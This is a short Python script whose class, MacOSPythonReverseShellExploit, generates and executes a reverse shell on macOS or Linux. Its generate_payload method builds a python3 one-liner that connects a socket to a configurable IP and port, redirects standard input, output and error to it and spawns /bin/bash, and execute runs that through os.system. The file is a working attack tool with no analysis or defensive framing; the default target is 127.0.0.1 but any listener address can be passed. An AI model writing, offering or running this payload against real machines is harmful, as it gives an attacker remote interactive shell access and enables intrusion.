import os

class MacOSPythonReverseShellExploit:
    def __init__(self, target_ip, port=4444):
        self.target_ip = target_ip
        self.port = port
        print(f"[*] MacOSPythonReverseShellExploit initialized for target {self.target_ip} on port {self.port}")

    def generate_payload(self):
        """Generate a Python reverse shell payload for macOS/Linux."""
        payload = (
            f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{self.target_ip}\",{self.port}));os.dup2(s.fileno(),0);"
            f"os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
        )
        print(f"[*] Generated payload: {payload}")
        return payload

    def execute(self):
        """Executes the Python reverse shell payload."""
        payload = self.generate_payload()
        print(f"[*] Executing macOS/Linux Python reverse shell payload: {payload}")
        os.system(payload)

if __name__ == "__main__":
    exploit = MacOSPythonReverseShellExploit("127.0.0.1", 4444)
    exploit.execute()
